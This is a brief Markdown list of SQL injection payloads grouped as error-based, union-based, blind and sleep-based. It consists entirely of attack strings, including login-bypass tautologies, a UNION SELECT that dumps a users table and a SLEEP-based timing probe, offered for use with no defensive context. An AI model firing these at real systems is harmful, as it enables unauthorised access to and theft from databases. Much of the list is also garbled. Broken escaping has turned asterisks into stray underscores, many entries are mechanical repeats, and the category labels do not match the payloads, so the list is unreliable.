# SQL Injection Pay Load

## 分類

- Error Based
- Union Based
- Blind Based

## Error Based

- ' OR '1'='1
- ' OR '1'='1' --
- ' OR '1'='1' #
- ' OR '1'='1' /\* \*/
- ' OR '1'='1' /_'_/
- ' OR '1'='1' /_'_/ --
- ' OR '1'='1' /_'_/ #
- ' OR '1'='1' /_'_/ /\* \*/
- ' OR '1'='1' /_'_/ /_'_/
- ' OR '1'='1' /_'_/ /_'_/ --
- ' OR '1'='1' /_'_/ /_'_/ #
- ' OR '1'='1' /_'_/ /_'_/ /\* \*/

## Union Based

- ' OR '1'='1' UNION SELECT \* FROM users
- ' OR '1'='1' UNION SELECT \* FROM users --
- ' OR '1'='1' UNION SELECT \* FROM users #
- ' OR '1'='1' UNION SELECT _ FROM users /_ \*/
- ' OR '1'='1' UNION SELECT _ FROM users /_'\*/
- ' OR '1'='1' UNION SELECT _ FROM users /_'\*/ --
- ' OR '1'='1' UNION SELECT _ FROM users /_'\*/ #
- ' OR '1'='1' UNION SELECT _ FROM users /_'_/ /_ \*/
- ' OR '1'='1' UNION SELECT _ FROM users /_'_/ /_'\*/
- ' OR '1'='1' UNION SELECT _ FROM users /_'_/ /_'\*/ --
- ' OR '1'='1' UNION SELECT _ FROM users /_'_/ /_'\*/ #
- ' OR '1'='1' UNION SELECT _ FROM users /_'_/ /_'_/ /_ \*/

## Blind Based

- ' OR '1'='1' AND 1=1 --
- ' OR '1'='1' AND 1=1 #
- ' OR '1'='1' AND 1=1 /\* \*/
- ' OR '1'='1' AND 1=1 /_'_/
- ' OR '1'='1' AND 1=1 /_'_/ --
- ' OR '1'='1' AND 1=1 /_'_/ #
- ' OR '1'='1' AND 1=1 /_'_/ /\* \*/
- ' OR '1'='1' AND 1=1 /_'_/ /_'_/
- ' OR '1'='1' AND 1=1 /_'_/ /_'_/ --
- ' OR '1'='1' AND 1=1 /_'_/ /_'_/ #
- ' OR '1'='1' AND 1=1 /_'_/ /_'_/ /\* \*/
- ' OR '1'='1' AND 1=1 /_'_/ /_'_/ /_'_/
- ' OR '1'='1' AND 1=1 /_'_/ /_'_/ /_'_/ --
- ' OR '1'='1' AND 1=1 /_'_/ /_'_/ /_'_/ #
- ' OR '1'='1' AND 1=1 /_'_/ /_'_/ /_'_/ /\* \*/
- ' OR '1'='1' AND 1=1 /_'_/ /_'_/ /_'_/ /_'_/
- ' OR '1'='1' AND 1=1 /_'_/ /_'_/ /_'_/ /_'_/ --
- ' OR '1'='1' AND 1=1 /_'_/ /_'_/ /_'_/ /_'_/ #
- ' OR '1'='1' AND 1=1 /_'_/ /_'_/ /_'_/ /_'_/ /\* \*/

## Sleep

- ' OR '1'='1' AND SLEEP(5) --
